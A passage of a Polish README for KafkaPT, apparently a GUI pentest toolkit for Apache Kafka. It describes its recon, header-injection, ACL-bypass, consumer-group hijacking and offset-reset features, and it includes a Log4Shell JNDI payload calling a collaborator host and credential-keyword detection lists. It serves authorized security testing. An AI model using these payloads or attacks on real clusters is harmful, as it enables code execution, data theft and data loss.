# KafkaPT v2.5 — Kafka Pentest Toolkit

> **Desktopowy interfejs graficzny do testów bezpieczeństwa środowisk Apache Kafka.**
> Napisany w Python 3.11+ z PyQt6. Przeznaczony dla testerów penetracyjnych, badaczy bezpieczeństwa i deweloperów przeprowadzających audyty wdrożeń Kafka.

---

## Spis treści

1. [Podstawy — Czym jest Apache Kafka?](#1-podstawy--czym-jest-apache-kafka)
2. [Czym są testy penetracyjne?](#2-czym-są-testy-penetracyjne)
3. [Czym jest KafkaPT?](#3-czym-jest-kafkapt)
4. [Co nowego w v2.5?](#4-co-nowego-w-v25)
5. [Wymagania wstępne](#5-wymagania-wstępne)
6. [Instalacja](#6-instalacja)
7. [Uruchomienie narzędzia](#7-uruchomienie-narzędzia)
8. [Przegląd interfejsu](#8-przegląd-interfejsu)
9. [Zakładka ⚙ CONFIG](#9-zakładka--config)
   - [SCHEMA](#91-pod-zakładka-schema)
   - [CERTIFICATES](#92-pod-zakładka-certificates)
   - [ENCRYPTION](#93-pod-zakładka-encryption)
   - [PROXY / BURP](#94-pod-zakładka-proxy--burp)
10. [Zakładka RECON](#10-zakładka-recon)
11. [Zakładka ATTACK](#11-zakładka-attack)
    - [HEADER INJECT](#111-header-inject)
    - [ACL BYPASS](#112-acl-bypass)
    - [OFFSET ATTACK](#113-offset-attack)
12. [Zakładka CONNECT](#12-zakładka-connect)
13. [Zakładka READ](#13-zakładka-read)
14. [Zakładka SEND](#14-zakładka-send)
15. [Zakładka RANDOMIZE](#15-zakładka-randomize)
16. [Zakładka FINDINGS](#16-zakładka-findings)
17. [Typowy przebieg testu penetracyjnego](#17-typowy-przebieg-testu-penetracyjnego)
18. [Opis presetów injekcji](#18-opis-presetów-injekcji)
19. [Rozumienie findingów](#19-rozumienie-findingów)
20. [Eksport wyników](#20-eksport-wyników)
21. [Rozwiązywanie problemów](#21-rozwiązywanie-problemów)
22. [Zastrzeżenie prawne](#22-zastrzeżenie-prawne)

---

## 1. Podstawy — Czym jest Apache Kafka?

Apache Kafka to **broker wiadomości** — system pozwalający aplikacjom wymieniać dane między sobą z dużą prędkością i niezawodnością. Wyobraź sobie lotnisko:

- **Topiki (topics)** to bramki — dane przepływają przez nie.
- **Producenci (producers)** to aplikacje *wysyłające* wiadomości do topiku.
- **Konsumenci (consumers)** to aplikacje *odczytujące* wiadomości z topiku.
- **Brokery (brokers)** to serwery Kafka przechowujące i kierujące wiadomościami.
- **Grupy konsumentów (consumer groups)** to zespoły konsumentów wspólnie przetwarzające topik.

Kafka jest stosowana w bankach, platformach opieki zdrowotnej, e-commerce i wszędzie tam, gdzie potrzebne są niezawodne, wysokoprzepustowe pipeline'y danych. To czyni ją wartościowym celem dla testów bezpieczeństwa.

**Dlaczego bezpieczeństwo Kafka jest ważne z perspektywy pentestera:**

- Wiadomości mogą zawierać dane osobowe (PII), rekordy płatności, poświadczenia lub klucze API przesyłane w plaintekście.
- Błędnie skonfigurowane ACLe umożliwiają dostęp do topików, do których atakujący nie powinien mieć dostępu.
- Nagłówki wiadomości są przekazywane do systemów downstream bez sanityzacji — otwierając możliwości dla Log4Shell, SSRF i injekcji szablonów.
- Offsety grup konsumentów można manipulować, powodując utratę danych lub wymuszając ponowne przetwarzanie wiadomości.
- Schema Registry ujawnia wewnętrzne struktury danych organizacji.
- Konfiguracje Kafka Connect często zawierają hasła do baz danych i klucze chmurowe.

---

## 2. Czym są testy penetracyjne?

Testy penetracyjne (pentesty) to **autoryzowane, kontrolowane hakowanie**. Specjalista ds. bezpieczeństwa otrzymuje pisemne pozwolenie od właściciela systemu na przeprowadzenie ataku, aby znaleźć podatności zanim zrobi to prawdziwy napastnik.

Pentest zawsze wymaga:
- **Pisemnej autoryzacji** (dokument zakresu lub umowa).
- **Zdefiniowanych granic** (które systemy można testować, których nie).
- Celu: **znalezienia, udokumentowania i pomocy w naprawie** słabości.

**Nigdy nie używaj tego narzędzia wobec systemów, na których testowanie nie masz pisemnego pozwolenia.**

---

## 3. Czym jest KafkaPT?

KafkaPT v2.5 to **desktopowe narzędzie z interfejsem graficznym** opakowujące typowe zadania pentestów Kafka w wizualny interfejs — bez konieczności zapamiętywania argumentów wiersza poleceń.

**Pełna lista możliwości:**

| Obszar | Możliwość |
|---|---|
| **Uwierzytelnianie** | mTLS (certyfikaty klienta), SASL PLAIN, SCRAM-SHA-256, SCRAM-SHA-512, kombinowany SASL_SSL |
| **Rozpoznanie** | Topologia brokerów, enumeracja topików, grupy konsumentów, opis ACLi |
| **Schema Registry** | Pobieranie schematów po ID, brute-force enumeracja z kontrolą prędkości i back-off na 429 |
| **Inspekcja danych** | Konsumowanie i dekodowanie wiadomości (JSON, Avro, hex, base64); wyświetlanie nagłówków Kafka |
| **Injekcja danych** | Produkowanie wiadomości z niestandardowym JSON, Avro lub surowymi bajtami; nagłówki injekcji |
| **Injekcja nagłówków** | 16 wbudowanych ładunków: Log4Shell, SSRF, SSTI, SQLi, XSS, XXE, injekcja poleceń, path traversal |
| **Testowanie ACL** | Próby nieautoryzowanego odczytu/zapisu; dołączanie do cudzej grupy konsumentów (ghost consumer) |
| **Ataki offsetów** | Reset offsetów grupy do earliest/latest/specific (z potwierdzeniem) |
| **Burp Suite** | Routing ruchu HTTP Schema Registry przez Burp; podstawianie URL Collaboratora w ładunkach |
| **Polling Collaboratora** | Odpytywanie własnego serwera Burp Collaborator; callbacki DNS/HTTP/SMTP → automatyczny finding CRITICAL |
| **Kafka Connect** | Enumeracja connectorów, odczyt konfiguracji, skanowanie credentiali i wbudowanych haseł JDBC |
| **Obsługa Avro** | Deserializacja wiadomości z załadowanym schematem; generowanie losowych prawidłowych ładunków Avro |
| **Szyfrowanie ładunków** | AES-128/256-CBC/GCM, ChaCha20-Poly1305 z konfigurowalnymi trybami IV |
| **Findingi** | Automatyczna deduplikacja; poziomy ważności CRITICAL/HIGH/MEDIUM/LOW/INFO; eksport Markdown |
| **Eksport dowodów** | Wiadomości jako NDJSON; findingi jako raport Markdown |

---

## 4. Co nowego w v2.5?

Jeśli używałeś KafkaPT v2.0, poniżej znajduje się zestawienie wszystkich zmian.

### Poprawki UI
- **Przyciski `+` / `−` są teraz widoczne** w tabelach nagłówków. W v2.0 były niewidoczne z powodu konfliktu CSS padding. Naprawione przez dedykowaną klasę `#btn_icon`.
- **Skalowanie fontów dla ekranów HiDPI / 4K.** Combo `Font:` w pasku nagłówka pozwala wybrać 100% / 125% / 150% / 175%.
- **Przeprojektowany layout** — ciasna sekcja konfiguracyjna o maksymalnej wysokości 340 px zniknęła. Wszystko mieści się w jednym pasku zakładek. Pierwsza zakładka (`⚙ CONFIG`) zawiera wszystkie pod-zakładki konfiguracyjne z pełną wysokością okna.

### Nowe funkcje bezpieczeństwa
- **Obsługa SASL** — PLAIN, SCRAM-SHA-256 i SCRAM-SHA-512 w zakładce CERTIFICATES. Działa samodzielnie (`SASL_PLAINTEXT`) lub łącznie z mTLS (`SASL_SSL`). Wszystkie workery Kafka (konsument, producent, recon, reset offsetów) przyjmują poświadczenia SASL.
- **Kontrola prędkości enumeracji schematów** — konfigurowalny delay (0–10 000 ms) między requestami, opcjonalny ±30% losowy jitter (tryb stealth), automatyczny eksponencjalny back-off przy HTTP 429.
- **Deduplikacja findingów** — identyczne findingi z powtarzanych operacji są cicho odrzucane.
- **Bezpieczne zatrzymywanie wątków** — `QThread.terminate()` zastąpiony kooperatywnym `_stop_flag`; brak osieroconych połączeń z brokerem.
- **Polling Burp Collaboratora** — odpytywanie własnego serwera Collaborator w poszukiwaniu wyników interakcji. Callbacki DNS, HTTP i SMTP są automatycznie rejestrowane jako findingi CRITICAL.
- **Panel Kafka Connect** — nowa zakładka `CONNECT` do enumeracji connectorów, odczytywania konfiguracji, skanowania credentiali i listowania zainstalowanych pluginów.

---

## 5. Wymagania wstępne

**1. Python 3.11 lub nowszy**
```bash
python3 --version
```
Pobierz z [python.org](https://www.python.org/downloads/) jeśli potrzeba.

**2. pip**
```bash
pip --version
```

**3. Środowisko Kafka do testowania** (z pisemną autoryzacją)

Do testów lokalnych bez rzeczywistego klastra uruchom Kafka przez Docker:
```bash
docker run -d --name kafka -p 9092:9092 \
  -e KAFKA_CFG_NODE_ID=1 \
  -e KAFKA_CFG_PROCESS_ROLES=broker,controller \
  -e KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093 \
  -e KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT \
  -e KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=1@localhost:9093 \
  -e KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER \
  bitnami/kafka:latest
```

**4. (Opcjonalnie) Burp Suite Professional**
Wymagany tylko do pollingu Collaboratora. Bezpłatna wersja Community Edition jest wystarczająca do przechwytywania HTTP Schema Registry. Pobierz z [portswigger.net](https://portswigger.net/burp).

**5. (Opcjonalnie) Certyfikaty mTLS**
- `ca-cert.pem` — Urząd Certyfikacji
- `client-cert.pem` — Twój certyfikat klienta
- `client-key.pem` — Twój klucz prywatny klienta

---

## 6. Instalacja

### Krok 1 — Sklonuj lub pobierz

```bash
git clone https://github.com/KarlitoQ/Kafka.git
cd kafkapt
```

### Krok 2 — Utwórz wirtualne środowisko (zalecane)

```bash
python3 -m venv venv

# Linux / macOS:
source venv/bin/activate

# Windows:
venv\Scripts\activate
```

### Krok 3 — Zainstaluj zależności

```bash
pip install PyQt6 confluent-kafka fastavro requests cryptography
```

| Pakiet | Przeznaczenie |
|---|---|
| `PyQt6` | Framework interfejsu graficznego |
| `confluent-kafka` | Połączenia z brokerem Kafka (producent, konsument, admin) |
| `fastavro` | Serializacja i deserializacja Avro |
| `requests` | Klient HTTP dla Schema Registry i Kafka Connect REST API |
| `cryptography` | Szyfrowanie ładunków AES i ChaCha20 |

> **Na Linuxie**, jeśli PyQt6 zgłasza błędy brakujących bibliotek:
> ```bash
> sudo apt-get install libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1
> ```

### Krok 4 — Weryfikacja

```bash
python3 -c "import PyQt6, confluent_kafka, fastavro, requests, cryptography; print('OK')"
```

---

## 7. Uruchomienie narzędzia

```bash
python3 kafka-pt-v2.py
```

Otworzy się okno. Pasek tytułu pokazuje **KafkaPT v2.5 // Kafka Pentest Toolkit**.

**Stałe kontrolki w nagłówku (zawsze widoczne):**

| Kontrolka | Opis |
|---|---|
| **Font:** combo | Skaluje fonty UI: 100% (domyślnie), 125%, 150%, 175%. Użyj 125%+ na ekranach 4K/HiDPI. |
| **☀ LIGHT / ☾ DARK** | Przełącza motyw jasny/ciemny. |

---

## 8. Przegląd interfejsu

KafkaPT używa jednego paska zakładek na pełnej szerokości okna:

```
┌──────────────────────────────────────────────────────────────────────┐
│  KAFKAPT                                  Font: [100%▾]  [☀ LIGHT]  │
│  Kafka Pentest Toolkit / v2.5 / Sprint 0+1+2+3                       │
│──────────────────────────────────────────────────────────────────────│
│  ⚙ CONFIG │ RECON │ ATTACK │ CONNECT │ READ │ SEND │ RANDOMIZE │ FINDINGS │
│                                                                      │
│  (pełna wysokość okna — bez ciasnej sekcji u góry)                   │
└──────────────────────────────────────────────────────────────────────┘
```

**Zalecana kolejność pracy:** `⚙ CONFIG` → `RECON` → `ATTACK` → `CONNECT` → `READ` → `SEND` → `RANDOMIZE` → `FINDINGS`

---

## 9. Zakładka ⚙ CONFIG

Zakładka CONFIG zawiera wszystkie cztery pod-zakładki konfiguracyjne w jednym panelu. Tutaj ustawiasz parametry połączenia **przed** uruchomieniem jakichkolwiek testów. Pod-zakładki dostępne są przez drugi rząd mniejszych zakładek wewnątrz panelu CONFIG.

---

### 9.1 Pod-zakładka SCHEMA

**Co to jest:** Łączy się ze Schema Registry — serwisem HTTP przechowującym format danych (schemat) wiadomości Kafka. Pobranie schematu pozwala KafkaPT dekodować wiadomości Avro w zakładce READ i kodować je w SEND.

**Dlaczego ważne dla pentestera:** Schema Registry to serwis HTTP, który Burp Suite może przechwycić. Jego ID schematów można brute-forcować, aby odkryć struktury danych, do których nie masz jawnego dostępu.

#### Pola i przyciski:

| Pole / Przycisk | Opis |
|---|---|
| **Registry URL** | Adres Schema Registry, np. `http://schema-registry:8081` lub `https://registry.internal:8443`. |
| **Schema ID** | Numeryczne ID schematu do pobrania. Zacznij od `1`. |
| **FETCH SCHEMA** | Pobiera schemat o podanym ID. JSON pojawia się w obszarze poniżej. Załadowany schemat jest automatycznie używany do Avro w READ i SEND. |
| **Status schematu** | Pokazuje sukces, błąd lub postęp. |
| **Enum IDs — from / to** | Zakres ID do automatycznego skanowania, np. `1` do `500`. |
| **Delay (ms)** | Milisekundy oczekiwania między requestami podczas enumeracji. 0 = maksymalna prędkość. Użyj 500–2000 ms, aby uniknąć wykrycia lub wywołania rate limitingu. |
| **Jitter** (checkbox) | Dodaje ±30% losową wariację do każdego opóźnienia. Razem z delay-em utrudnia wykrycie enumeracji. |
| **ENUMERATE** | Uruchamia skan brute-force. Znalezione schematy pojawiają się na zielono. |
| **STOP** | Zatrzymuje trwającą enumerację. |
| **Pasek postępu** | Pokazuje postęp w zakresie ID. |

> **Rate limiting (HTTP 429):** Jeśli Schema Registry zwróci HTTP 429, KafkaPT automatycznie cofa się stosując eksponencjalny delay (do 60 sekund) i ponawia próbę dla tego samego ID. W logu pojawia się ostrzeżenie `[THROTTLED]`.

---

### 9.2 Pod-zakładka CERTIFICATES

**Co to jest:** Konfiguruje certyfikaty mTLS (wzajemny TLS) i poświadczenia SASL dla połączeń z brokerem Kafka i Schema Registry.

#### Sekcja mTLS:

| Pole / Przycisk | Opis |
|---|---|
| **mTLS — Schema Registry** (checkbox) | Włącza autoryzację certyfikatami dla requestów HTTP do Schema Registry. |
| **mTLS — Kafka Broker** (checkbox) | Włącza autoryzację certyfikatami dla wszystkich połączeń z brokerem. |
| **CA Cert** | Ścieżka do pliku CA (`.pem`). Weryfikuje tożsamość serwera. Kliknij **BROWSE**. |
| **Client Cert** | Ścieżka do Twojego certyfikatu klienta (`.pem`). Potwierdza Twoją tożsamość wobec serwera. |
| **Client Key** | Ścieżka do Twojego klucza prywatnego (`.pem`). |
| **Key Passphrase** | Hasło zaszyfrowanego klucza prywatnego. Zostaw puste jeśli nie jest wymagane. |
| **Verify server certificate** | Gdy zaznaczone (domyślnie), weryfikuje certyfikat serwera wobec CA. Odznacz dla certyfikatów samopodpisanych. |

#### Sekcja SASL (nowe w v2.5):

| Pole / Przycisk | Opis |
|---|---|
| **Enable SASL authentication** (checkbox) | Aktywuje pola SASL poniżej. Może być używany samodzielnie lub łącznie z mTLS. |
| **Mechanism** | `PLAIN`, `SCRAM-SHA-256` lub `SCRAM-SHA-512`. |
| **Username** | Nazwa użytkownika SASL. |
| **Password** | Hasło SASL (maskowane). |
| **Etykieta protokołu** | Dynamicznie pokazuje wynikowy protokół bezpieczeństwa: `SASL_PLAINTEXT` (tylko SASL) lub `SASL_SSL` (SASL + mTLS). |

> **Uwaga pentesterska:** Jeśli broker akceptuje połączenie bez certyfikatów i bez SASL — to finding **HIGH** (brak uwierzytelniania).

---

### 9.3 Pod-zakładka ENCRYPTION

**Co to jest:** Konfiguruje szyfrowanie ładunków na poziomie aplikacji. Używaj tylko jeśli wiesz, że docelowy system szyfruje wiadomości Kafka na poziomie aplikacji (oddzielnie od TLS transportowego).

Zostaw jako `None (Avro only)` jeśli nie jesteś pewien.

| Pole | Opis |
|---|---|
| **Cipher Mode** | `None`, `AES-128-CBC`, `AES-256-CBC`, `AES-128-GCM`, `AES-256-GCM` lub `ChaCha20-Poly1305`. |
| **Shared Secret** | Klucz szyfrowania (maskowany). Kliknij **SHOW** aby ujawnić. |
| **Key Encoding** | Jak zakodowany jest klucz: `hex`, `base64` lub `utf-8 raw`. |
| **IV / Nonce** | Obsługa wektora inicjalizacji: losowy na wiadomość (zalecany), stały lub dołączony do szyfrogramu. |

---

### 9.4 Pod-zakładka PROXY / BURP

**Co to jest:** Kieruje ruch HTTP Schema Registry przez Burp Suite do przechwycenia oraz konfiguruje integrację z Burp Collaboratorem do wykrywania callbacków poza-pasmowych.

#### Sekcja HTTP Proxy:

| Pole / Przycisk | Opis |
|---|---|
| **Enable HTTP proxy** (checkbox) | Gdy włączony, wszystkie requesty HTTP do Schema Registry przechodzą przez proxy. |
| **Proxy URL** | Adres nasłuchu Burpa. Domyślnie: `http://127.0.0.1:8080`. |
| **TEST** | Wysyła testowy request aby sprawdzić czy proxy działa. |
| **Schema Registry** (checkbox) | Kieruje ruch Schema Registry przez proxy (zawsze włączony gdy proxy jest aktywne). |
| **Collaborator URL** | Twoja domena Collaboratora (np. `abc123.collab.internal`) — **bez** `http://`. To jest domena używana w ładunkach injekcji. Gdy wybierzesz preset Log4Shell, `COLLAB` zostaje zastąpiony tą wartością: `${jndi:ldap://abc123.collab.internal/a}`. |
| **Etykieta statusu** | Pokazuje czy proxy jest aktywne i osiągalne. |

#### Sekcja Collaborator Polling (nowe w v2.5):

Odpytuje Twój **własny** serwer Burp Collaborator w poszukiwaniu wyników interakcji.

| Pole / Przycisk | Opis |
|---|---|
| **Poll Server** | Adres serwera Collaboratora dla pollingu, np. `http://collab.internal:9090`. To jest **inne** pole niż domena payloadu powyżej — tutaj KafkaPT wysyła swoje requesty pollingu. |
| **BIID** | Burp Interaction ID (klucz pollingu). Uzyskaj go z Burp Pro → zakładka Collaborator. To zazwyczaj prefiks subdomeny Twojego Collaboratora. |
| **Interval** | Jak często odpytywać, w sekundach (5–300). Domyślnie 30 sekund. |
| **START POLLING** | Uruchamia pollowanie w tle. KafkaPT działa normalnie podczas pollowania. |
| **STOP** | Zatrzymuje wątek pollowania. |
| **Etykieta statusu** | Pokazuje czas ostatniego odebranego callbacku lub aktualny stan pollowania. |

Gdy callback zostanie odebrany:
- Finding **CRITICAL** jest automatycznie dodawany do zakładki FINDINGS.
- Finding zawiera: typ interakcji (DNS/HTTP/SMTP), adres IP klienta, ID interakcji i surowy request.
- Nie musisz ręcznie sprawdzać Burpa.

> **Ważne:** KafkaPT nie wysyła żadnych danych do zewnętrznych serwisów. Polling jest kierowany wyłącznie na Twój wewnętrzny serwer Collaboratora. Żaden ruch nie opuszcza Twojej sieci.

---

## 10. Zakładka RECON

**Co to jest:** Łączy się z brokerem Kafka i zbiera informacje o środowisku — jakie brokery istnieją, jakie topiki są widoczne, jakie grupy konsumentów są aktywne i jakie reguły ACL są skonfigurowane.

**Uruchom to jako pierwsze** przed jakimikolwiek atakami. Zebrane informacje bezpośrednio zasilają zakładkę ATTACK.

#### Pola i przyciski:

| Pole / Przycisk | Opis |
|---|---|
| **Broker** | Adres brokera, np. `kafka.internal:9093`. |
| **RUN ALL** | Uruchamia wszystkie trzy fazy (topologia + grupy + ACLe) jednym kliknięciem. Zacznij tutaj. |
| **FETCH TOPOLOGY** | Pobiera brokery i topiki przez `Consumer.list_topics()`. Działa bez uprawnień admina. |
| **LIST GROUPS** | Listuje grupy konsumentów przez `AdminClient.list_consumer_groups()`. Może wymagać dostępu admina. |
| **DESCRIBE ACLs** | Pobiera reguły ACL. Wymaga uprawnień `DescribeConfigs`. Jeśli odmówiono dostępu, sam ten fakt jest wyświetlany (oczekiwane dla certyfikatów nie-admin). |
| **STOP** | Czysto zatrzymuje trwającą operację recon między fazami. Żadne połączenia z brokerem nie są pozostawiane otwarte. |

#### Pod-zakładka TOPOLOGY:
- **Lewy panel (Brokery):** ID brokera, hostname i port każdego brokera.
- **Prawy panel (Topiki):** Nazwa topiku i liczba partycji. Topiki wewnętrzne (zaczynające się od `__`) są ukryte.

#### Pod-zakładka GROUPS:
Listuje wszystkie ID grup konsumentów widocznych dla Twoich aktualnych poświadczeń. Każde ID grupy jest potencjalnym celem dla ataku GHOST JOIN.

#### Pod-zakładka ACLS:
- Wyświetla każdą regułę ACL w ustrukturyzowanym formacie.
- Linie gdzie `User:*` ma uprawnienia `Allow` są podświetlone na **czerwono** — oznacza to że każdy uwierzytelniony klient może wykonać tę operację.
- Jeśli znaleziono wildcard ACLe, pojawia się etykieta ostrzegawcza i automatycznie generowany jest finding **CRITICAL**.

> **Uwaga:** „ACL enumeration denied — not authorized" jest **normalne i oczekiwane** dla certyfikatów nie-admin. Broker działa poprawnie.

---

## 11. Zakładka ATTACK

**Co to jest:** Trzy kategorie aktywnych ataków na Kafka. Wykorzystaj informacje zebrane w RECON do wyboru celów.

> ⚠️ **Ostrzeżenie:** Działania w tej zakładce mogą zakłócać działanie serwisów produkcyjnych. Pod-zakładka OFFSET ATTACK może powodować trwałą utratę danych. Zawsze uzyskaj jawną pisemną autoryzację.

---

### 11.1 HEADER INJECT

**Co testuje:** Czy złośliwe wartości w nagłówkach wiadomości Kafka docierają do konsumentów downstream bez sanityzacji. Jeśli konsument przetwarza wartość nagłówka jako szablon, zapytanie SQL lub wpis logu, ładunki injekcji mogą wywołać zdalne wykonanie kodu (Log4Shell), SSRF lub injekcję szablonów.

| Pole / Przycisk | Opis |
|---|---|
| **Broker** | Adres brokera dla tego testu. |
| **Topic** | Topik do wysłania wstrzykniętej wiadomości. |
| **Message body** | Treść JSON wiadomości. Domyślnie `{"legit":"payload"}`. |
| **Preset** (lista) | Wybierz typ injekcji. Ładunek jest stosowany do wszystkich komórek wartości nagłówków. Jeśli nie ma wierszy, domyślne nagłówki są dodawane automatycznie. |
| **Przycisk +** | Dodaj nowy wiersz nagłówka. |
| **Przycisk −** | Usuń zaznaczony wiersz nagłówka. |
| **Kolumna Header Name** | Nazwa nagłówka Kafka (np. `X-Trace-ID`, `User-Agent`). |
| **Kolumna Header Value** | Ładunek. Placeholder `COLLAB` jest zastępowany Twoim URL Collaboratora z CONFIG. |
| **INJECT** | Wysyła jedną wiadomość ze wszystkimi skonfigurowanymi nagłówkami. Przy powodzeniu dodawany jest finding **HIGH**. |

---

### 11.2 ACL BYPASS

**Co testuje:** Czy Twój aktualny certyfikat lub poświadczenia mogą uzyskać dostęp do zasobów Kafka, do których nie powinny mieć dostępu.

| Pole / Przycisk | Opis |
|---|---|
| **Broker** | Adres brokera. |
| **Target topic** | Topik, do którego **nie powinieneś** mieć dostępu (odkryty w RECON → TOPOLOGY). |
| **Ghost group ID** | ID grupy konsumentów należącej do legalnego serwisu (z RECON → GROUPS). |
| **TEST READ** | Próba skonsumowania jednej wiadomości z docelowego topiku. Sukces → finding **CRITICAL**. Porażka → komunikat błędu pokazuje które ACL zablokowało. |
| **TEST WRITE** | Próba wyprodukowania wiadomości-markera do docelowego topiku. Sukces → finding **CRITICAL**. |
| **GHOST JOIN** | Dołącza do podanej grupy konsumentów na docelowym topiku. Jeśli Kafka na to pozwoli, klient dostaje przypisane partycje — kradnąc wiadomości od legalnego serwisu. Przed wykonaniem pojawia się dialog potwierdzenia. Sukces → finding **CRITICAL**. |

---

### 11.3 OFFSET ATTACK

**Co testuje:** Czy możesz zmanipulować zapisaną pozycję odczytu grupy konsumentów, powodując ponowne przetworzenie wiadomości (atak powtórzeniowy) lub ich pominięcie (utrata danych).

| Pole / Przycisk | Opis |
|---|---|
| **Broker** | Adres brokera. |
| **Consumer Group** | Grupa, której offsety chcesz zresetować (z RECON → GROUPS). |
| **Topic** | Topik w którym resetować offsety. |
| **Reset to** | `earliest` — wymusza ponowne przetworzenie wszystkich wiadomości od początku. `latest` — pomija wszystkie oczekujące wiadomości (utrata danych). `specific offset` — skacze do konkretnego numeru offsetu. |
| **Specific offset** (licznik) | Docelowy numer offsetu. Aktywny tylko gdy wybrano "specific offset". |
| **EXECUTE OFFSET RESET** | Wykonuje reset. Obowiązkowy dialog potwierdzenia z opisem konsekwencji. Sukces → finding **HIGH**. |

---

## 12. Zakładka CONNECT

**Co to jest:** Explorer dla Kafka Connect REST API (domyślny port 8083). Konfiguracje connectorów Kafka Connect często zawierają hasła do baz danych, klucze S3 i connection stringi JDBC z wbudowanymi hasłami.

**Dlaczego to ważne:** Kafka Connect REST API jest często pozostawiane bez uwierzytelniania. Nawet gdy jest chronione, konfiguracje connectorów mogą ujawniać sekrety, które powinny być przechowywane w vault.

#### Pola i przyciski:

| Pole / Przycisk | Opis |
|---|---|
| **Connect Server** | Adres Kafka Connect REST API, np. `http://kafka-connect:8083`. |
| **Basic Auth** (checkbox) | Włącza uwierzytelnianie username/password dla requestów REST API. |
| **Username / Password** | Poświadczenia Basic Auth (aktywne tylko gdy Basic Auth jest zaznaczone). |
| **Verify SSL** (checkbox) | Weryfikacja certyfikatu TLS serwera. Odznacz dla certyfikatów samopodpisanych. |
| **LIST CONNECTORS** | `GET /connectors` — lista nazw connectorów. Jeśli API odpowiada bez poświadczeń → finding **MEDIUM** (nieautoryzowany dostęp). |
| **FULL SCAN** | Listuje connectory ORAZ pobiera pełną konfigurację i status każdego. Uruchamia skanowanie credentiali. |
| **SHOW PLUGINS** | `GET /connector-plugins` — lista zainstalowanych klas pluginów. |
| **STOP** | Zatrzymuje trwający skan. |

#### Lewy panel — drzewo Connectors / Plugins:
- Węzeł **CONNECTORS**: każda nazwa connectora ze znacznikiem stanu (RUNNING na zielono, FAILED na czerwono, PAUSED na bursztynowo).
- Węzeł **PLUGINS** (po SHOW PLUGINS): zainstalowane nazwy klas i typy pluginów.
- Kliknij connector aby wyświetlić jego konfigurację po prawej.

#### Prawy panel — widok konfiguracji:
- Wyświetla pełny JSON konfiguracji wybranego connectora.
- Linie zawierające klucze związane z credentialami są automatycznie annotowane `← [CREDENTIAL KEY]`. Wykrywane słowa kluczowe: `password`, `secret`, `api_key`, `token`, `credential`, `db.password`, `access_key`, `s3.secret.key` i inne.
- URL-e JDBC z wbudowanymi hasłami (np. `jdbc:mysql://user:pass@host:3306/db`) są annotowane `← [EMBEDDED CRED IN URL]`.

---

## 13. Zakładka READ

**Co to jest:** Konsument Kafka. Odczytuje wiadomości z topiku i wyświetla je w czytelnym formacie. Używany do inspekcji jakie dane przepływają przez środowisko docelowe.

**Dlaczego przydatny w pentestach:** W ten sposób znajdujesz dane PII, poświadczenia, klucze API i inne wrażliwe informacje płynące przez topiki Kafka w plaintekście. KafkaPT automatycznie skanuje każdą wiadomość i dodaje findingi.

#### Pasek połączenia:

| Pole | Opis |
|---|---|
| **Broker** | Adres brokera. |
| **Topic** | Topik do odczytania. |
| **Consumer Group** | ID grupy. Domyślnie `kafkapt-consumer`. Zmień jeśli topik wymaga konkretnej grupy. |

#### Opcje:

| Pole | Opis |
|---|---|
| **Start Offset** | `latest` — odczytaj tylko nowe wiadomości. `earliest` — czytaj od samego początku (może być dużo). `specific` — zacznij od konkretnego numeru offsetu. |
| **Max Messages** | Liczba wiadomości do skonsumowania przed zatrzymaniem. Domyślnie 1. |

#### Przyciski:

| Przycisk | Opis |
|---|---|
| **READ MESSAGE(S)** | Uruchamia konsumowanie. Wiadomości pojawiają się w lewym panelu logu. |
| **STOP** | Zatrzymuje konsumowanie przed osiągnięciem limitu. |
| **CLEAR** | Czyści wszystkie odebrane wiadomości. |
| **EXPORT NDJSON** | Zapisuje wszystkie odebrane wiadomości do pliku `.ndjson` (jeden JSON na linię). Każdy rekord zawiera: topik, partycję, offset, timestamp, nagłówki, zdekodowaną wartość i surowy hex. |

#### Widok szczegółów (prawy panel):

Nawiguj między wiadomościami przyciskami **< PREV** i **NEXT >**.

| Kontrolka | Opis |
|---|---|
| **Ignore schema** (checkbox) | Pomija dekodowanie Avro. Pokazuje surowe bajty. |
| **Display as** | Jak renderować wartość wiadomości: `auto-detect` (próbuje JSON → UTF-8 → hex dump), `hex`, `hex dump`, `UTF-8 raw` lub `base64`. |
| **Show headers** (checkbox) | Pokazuje nagłówki wiadomości Kafka pod zdekodowaną wartością. |
| **COPY** | Kopiuje aktualnie wyświetlaną zawartość wiadomości do schowka. |

**Automatyczne skanowanie:** KafkaPT skanuje każdą wiadomość pod kątem numerów kart kredytowych (wzorce 16-cyfr), adresów email i słów kluczowych poświadczeń (`password`, `token`, `api_key` itp.). Jeśli znajdzie — finding **HIGH** jest dodawany do FINDINGS z dowodem.

---

## 14. Zakładka SEND

**Co to jest:** Producent Kafka. Wysyła wiadomości do topiku z opcjonalnymi niestandardowymi nagłówkami do testów injekcji.

#### Pasek połączenia:

| Pole | Opis |
|---|---|
| **Broker** | Adres brokera. |
| **Topic** | Topik do publikowania. |
| **Message Key** | Opcjonalny klucz partycji. Zostaw puste dla losowego przypisania partycji. |

#### Opcje ładunku:

| Kontrolka | Opis |
|---|---|
| **Payload Source** | `Manual JSON` — wpisz ładunek poniżej. `From Randomizer` — generuj losowy ładunek Avro na każdą wiadomość. `From Reader (replay)` — wklej wiadomość przechwyconą z zakładki READ. |
| **Ignore schema** (checkbox) | Wyślij surowe bajty bez serializacji Avro. |
| **Encoding** (tryb surowy) | `UTF-8`, `hex` lub `base64`. Jak KafkaPT interpretuje surowe wejście. |
| **Edytor ładunku** | Wpisz lub wklej swój ładunek JSON. |

#### Sekcja Kafka Headers:

Ta sama tabela nagłówków injekcji co w ATTACK → HEADER INJECT. Dołącz dowolną liczbę nagłówków do każdej wychodzącej wiadomości.

#### Kontrolki wysyłania:

| Kontrolka | Opis |
|---|---|
| **SEND MESSAGE** | Wysyła wiadomość. Potwierdzenie dostarczenia pojawia się w logu poniżej. |
| **Repeat** (checkbox) | Wyślij tę samą wiadomość wielokrotnie. |
| **Repeat count** | Liczba powtórzeń. |
| **Licznik wysłanych** | Bieżąca liczba pomyślnie dostarczonych wiadomości w tej sesji. |

---

## 15. Zakładka RANDOMIZE

**Co to jest:** Generuje losowe, ale prawidłowe schematycznie ładunki Avro. Przydatne do fuzz testingu i produkowania wiadomości testowych gdy potrzebujesz prawidłowych danych bez ręcznego ich tworzenia.

